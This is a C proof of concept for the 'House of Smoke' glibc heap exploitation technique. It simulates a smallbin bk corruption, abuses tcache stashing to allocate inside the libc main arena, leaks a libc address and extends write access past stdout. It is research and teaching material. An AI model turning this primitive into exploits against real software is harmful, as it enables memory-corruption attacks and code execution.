/*
 * House of Smoke PoC
 *
 * PoC and technique by Imrane Haddaji (@tabacc0)
 *
 * Works on common builds of libc versions 2.26 to 2.41
 * 
 *
 * detailed explanation of the stashing unlink attack 
 * the core mechanism behind this , along with how this
 * technique expands on and test environements/build scripts 
 * for all * the mentioned versions it is at :
 *
 * https://github.com/tabacc0/HeapResearch
*/


/*
 * Note : This technique has an alignment problem that prevents it from 
 * working on builds where bins are not 0x10 aligned, this is true
 * for the current builds of glibc 2.42 and higher , all the builds
 * I found for arch and other rolling release distros have this problem
 * that is the reason compatibility is capped at 2.41
 * 
 * on the other hands I found no build of libc 2.26 to 2.41 that has 
 * this problem see the repo above for tests on popular builds.
 */


#include <stdlib.h>
#include <assert.h>
#include <stdio.h>
#include <unistd.h>

#define ALLOC_SIZE 0x220

int main(){
	//initialize tcache and calculate where it is, we do it now for the 
	//sake of simplicity because printfs call malloc make 
	//the heap layout complicated
	char *init = malloc(0x10);
	free(init);
	//ASSUMING HEAP LEAK TO CALCULATE WHERE TCACHE IS
	char *tcache = init - 0x10 - 0x240;
	//making it point to tcache entry of the size we are 
	//going to work with + 0x10 , this is so that we allocate
	//from a different tcache that the one holding victim 
	//as the one holding victim has issues in some ubuntu builds
	tcache += 0x40 + (int)((ALLOC_SIZE+0x10)/0x10 - 1)*8 ;

	printf("This PoC demonstrates the House of Smoke .\n\n");
	printf("This attack allows an attacker to return a chunk within\n");
	printf("the main arena whithout prior libc leak ,assuming read/write\n");
	printf("capability of the allocated chunk , this allows for both\n");
	printf("obtaining a leak and controling the writable libc reagion\n");
	printf("after our foothold in the arena , which is a smallbin\n\n");


	printf("the prerequisites are the same as the house of lore attack\n");
	printf("1) ability to modify the bk field of a freed smallbin chunk\n");
	printf("\n2) a heap leak\n");
	printf("additional light prerequisites are :\n\n");

	printf("\n3) a place in memory to construct a fake list , it can be\n");
	printf("   a heap chunk which we know the address of because of the\n");
	printf("   required heap leak\n");
	printf("\n4) being able to allocate 8 chunks for doing the attack , on its own\n");
	printf("   it gives a libc leak and the ability to write to a certain\n");
	printf("   number of arena bins\n");
	printf("\n5) additional allocations to control further libc space\n\n");

	//the smallbin chunk we will overwrite the bk of
	//to avoid having to fill/empty tcache we allocate a large
	//chunk , put it in the unsorted bin , and then allocate a chunk
	//that will be cut from it , leaving a chunk of the desired size
	//in the unsorted bin 
	printf("\n\nAllocating the victim chunk , to avoid filling/emtying tcache we\n");
	printf("allocate a large sized chunk (0x410 + desired size),place it in the unsorted\n");
	printf("bin and then allocate a chunk (size 0x400) that will be cut from it\n");
	printf("leaving us with a chunk of our desired size in the unsorted bin\n");
	char *victim = malloc(0x410 + ALLOC_SIZE);

	//this is a chunk we put in tcache then  we overwrite it with bin address
	printf("\n\nAllocating a chunk of victim size + 0x10\n");
	printf("\n\nwe will overwrite this chunk with bin address\n");
	char *tcache_chunk = malloc(ALLOC_SIZE+0x10);
	//to avoid consolidation with top
	printf("\n\nAllocating a guard chunk to avoid consolidatin with the top chunk\n");
	char *guard = malloc(0x1000);
	//put in tcache 
	free(tcache_chunk);
	//put victim in unsorted bin
	printf("\n\nFreeing victim\n");
	free(victim);
	//allocate a chunk that will be cut from victim 
	//the size of the remainder is ALLOC_SIZE
	printf("\n\nAllocating a chunk of size 0x400 to leave a chunk of the desired\n");
	printf("size in the usorted bin\n");
	char *trim_victim = malloc(0x400);
	//update victim to reflect the trim
	printf("\n\nUpdating the victim pointer , since it advanced by 0x410\n");
	victim =  trim_victim + 0x410 ;
	//the victim including metadata
	printf("\n\nInitializing victim_chuck with victim - 0x10 bytes to account for metadata\n");
	char **victim_chunk = (char **)victim-2;

	//sort victim into the small bin
	//this progression bypasses filling the tcache 
	//so 6 less allocations
	printf("\n\nAllocating a large chunk to sort victim into a smallbin\n");
	void *sort = malloc(0x1000);

	//keep the address of the smallbin for later sanity check
	char *smallbin = victim_chunk[3];

	printf("\n\nConstructing a fake list of chunks in the buffer we used for trimming\n");
	printf("victim , every item in this list is a chunk of size 0x10 that has and fd\n ");
	printf("poiting to the chuck just before it and and fd field\n");
	printf("the list is of size 6 , 1 less than tcache\n");
	
	//create a fake freelist on the heap , we can use 
	//the trim result for that
	char * (*freelist)[4] = (char * (*)[4])trim_victim;
	//links the fake list chunks
	for(int i=0; i<6; i++) {
		freelist[i][3] = (char*) freelist[i+1];
	}
	printf("\n\nTo bypass the smallbin corruption check , we make the fd field of the\n");
	printf("first element in the list point to victim_chunk");
	//to bypass the smallbin fd check
	freelist[0][2] = (char *) victim_chunk;


	printf("\n\nMaking the bk field of the last element of the fake list point to the\n");
	printf("tcache bin(-0x10 since the write will be to the fd field )\n");
	printf("corresponding to the size of victim\n");
	//the address of the smallbin will be written to 
	//(freelist[6]->bk)->fd 
	freelist[6][3] = (void*)tcache-0x10;

	printf("\n\nSimulating a vulnerability that lets us write the address of head of");
	printf("the list to victim bk now we have :\n");
	printf("victim-bk->6 linked fake chunks-bk->tcache");
	//------------VULNERABILITY-----------
	victim_chunk[3] = (char *)freelist[0]; 
	//------------------------------------

	//this allocates victim and starts filling tcache with chunks from
	//our freelist 
	printf("\n\nAllocating a chunk of victim size , this will trigger a tcach stashing\n");
	printf("from the smallbin holding victim , in the process of putting the last chunk\n");
	printf("of the fake list the address of the smallbin just before the one containing\n");
	printf("victim will be written to the tcache head of the tcache entry of tcache_chunk");
	printf("and after it the last fake chunk will inserted to tcache entry \n");
	printf(" of victim , for clarity here is the code that does this : \n");
	printf("\nbin->bk = bck;\nbck->fd = bin;\ntcache_put (tc_victim, tc_idx);\n\n");
	char *trigger = malloc(ALLOC_SIZE);

	printf("\n\nAllocating the bin address from the tcache entry of tcache_chunk\n");
	printf("after we overwrote it\n");
	printf("char **allocated = malloc(ALLOC_SIZE+0x10);\n");
	//ALLCATING BIN ADDRESS
	char **allocated = malloc(ALLOC_SIZE+0x10);
	printf("\n\nsanity check : \n");
	printf("assert((long)allocated == (long)smallbin);\n");
	assert((long)allocated == (long)smallbin);
	printf("passed !\n");


	printf("\n\nAssuming the attacker can read chunk , allocated[0] is a libc address\n");
	printf("of the bin right before the one that we allocated\n");
	printf("(this is because the bin is an incomplete malloc chunk strcuture)\n");
	printf("that only has the fd/bk half , and so by holding the address of the bin\n");
	printf("right before it in its fd/bk ,it would be point to itself as a pseudo-chunk)\n");
	printf("this is why the allocated address is of the one before the bin corresponding\n");
	printf("to victime despite the code writing the 'bin' address\n");
	//READING LEAK , ASSUMING READ CAPABILITY TO CHUNK
	printf("\nchar *leak = allocated[0];\n");
	char *leak = allocated[0];
	//the leak has the address of the bin immediately before
	printf("\nsanity check : \n");
	printf("assert((long)leak == (long)smallbin-0x10);\n");
	assert((long)leak == (long)smallbin-0x10);
	printf("passed !\n");
	



	printf("\n\n Now let's demonstrate how with read/write of chunks we allocate\n");
	printf("we will be able to allocate writable libc space even after the arena\n");
	printf("for this PoC we will be trying to go beyond the stdout FILE structure\n");

	printf("\n\nTo do the expansion we do the following operations in a loop :\n");
	printf("make the bk/fd of bin we allocated point to an address near of the area\n");
	printf("we allocated inside the arena , then at that address we construct a fake chunk\n");
	printf("whose fd/bk point back to the bin we allocated , to malloc this looks like \n");
	printf("the fake chunk we created is a normal chunk in the bin we allocated \n");
	printf("we can do this because we control the bin contents which are the source of\n");
	printf("truth in this situation, then we can just allocate the new chunk and that\n");
	printf("will give use a new reach further in libc space.\n");
	printf("then we can do it again to go futher , doing this in a loop we can expand\n");
	printf("well beyond the arena as long as we are carefull not to corrupt critical\n");
	printf("data that will cause a crash\n");
	//EXPANDING ALLOCATIONS TO THE REST OF LIBC SPACE AFTER THE BIN
	//in this example we will try to reach stdout
	//this is why this requires both read and write capability
	char **bin2 = allocated;
	char *expand = NULL;
	//make sure we started before stdout
	printf("\n\nMaking sure the allocated bin is before stdout:\n");
	printf("assert((long)allocated < (long) stdout);");
	assert((long)allocated < (long) stdout);
	printf("passed\n");
	char *backup[4];

	//this loop won't stop until we are well beyond the stdin file structure
	printf("\n\nstarting loop\n");
	printf("the loop will stop when we allocate an address beyond the stdout structure\n");
	printf("if ((long)expand > (long)stdout) break;\n\n");
	while (1){
		//enough
		if ((long)expand > (long)stdout) break;
		//keeping the next bin address within our write access range
		bin2 += (ALLOC_SIZE/8 - 6);
		//ASSUMING WRITE CAPABILITY TO THE CHUNK
		//fake links of current bin to point to the next allocated one
		allocated[0] = allocated[1] = (char *) bin2;

		//backup bin2 contents to restore them and avoid crashes
		//we are overwriting ciritical libc data with our fake 
		//chunk 
		//READING state , ASSUMING READ CAPABILITY TO CHUNK
		//we could get away with this if we knew what to write
		//in case of attacks like House of Orange.
		for (int j = 0 ; j < 4 ; j++){
			backup[j] = bin2[j];
		}

		//ASSUMING WRITE CAPABILITY TO THE CHUNK
		bin2[0] = bin2[1] = (char *) ALLOC_SIZE;
		//fake links of the next bin to point to current bin
		bin2[2] = bin2[3] = (char *) allocated-0x10;

		//allocating at bin2-0x10
		expand = malloc(ALLOC_SIZE - 0x10);
		//sanity check
		assert((long)expand == (long)bin2+0x10);
		//now that we have bin2 ,restore state
		for (int j = 0 ; j < 4 ; j++){
			bin2[j] = backup[j];
		}
	}

	printf("\n\nloop stoped , making sure expand is beyond stdout :\n");
	printf("assert((long)expand > (long) stdout);\n");
	assert((long)expand > (long) stdout);
	printf("passed!\n");


}
